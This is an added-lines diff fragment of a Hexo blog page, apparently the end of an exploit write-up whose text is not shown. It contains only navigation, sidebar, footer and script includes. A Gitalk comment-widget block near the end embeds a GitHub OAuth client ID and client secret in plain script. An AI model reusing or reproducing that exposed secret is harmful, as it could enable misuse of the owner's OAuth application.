href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8"><span class="nav-number">3.6.</span> <span class="nav-text">最终利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-EXP"><span class="nav-number">4.</span> <span class="nav-text">0x04-EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x05-参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">singsing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">singsing</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '6e8bfc081de57f042466',
+      clientSecret: '9b93268b65af7c8c4e8af7a5a1a539f01671b723',
+      repo        : 'sing3r.github.io',
+      owner       : 'sing3r',
+      admin       : ['sing3r'],
+      id          : 'a86dbf7170bd1879fae2816fc895fc57',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
